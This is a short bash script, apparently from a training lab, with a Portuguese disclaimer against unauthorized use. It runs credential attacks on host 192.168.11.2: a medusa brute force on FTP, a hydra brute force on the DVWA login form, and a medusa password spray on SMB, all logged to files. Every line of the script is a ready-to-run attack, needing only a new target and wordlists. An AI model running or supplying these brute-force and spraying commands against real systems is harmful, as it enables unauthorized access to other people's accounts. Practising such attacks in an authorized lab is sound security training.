#!/bin/bash
# Script educacional: NÃO execute contra sistemas sem autorização.
mkdir -p logs
echo "[*] Running example medusa FTP test..."
medusa -h 192.168.11.2 -M ftp -U wordlists/users.txt -P wordlists/passwords-small.txt -t 16 -f | tee logs/medusa-ftp.txt
echo "[*] Running example hydra DVWA test..."
hydra -l admin -P wordlists/passwords-small.txt 192.168.11.2 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Incorrect" | tee logs/hydra-dvwa.txt
echo "[*] Running example medusa SMB spray..."
medusa -h 192.168.11.2 -M smb -U wordlists/users-smb.txt -P wordlists/passwords-spray.txt -t 8 | tee logs/medusa-smb.txt
echo "[*] Done. Check the logs/ directory."
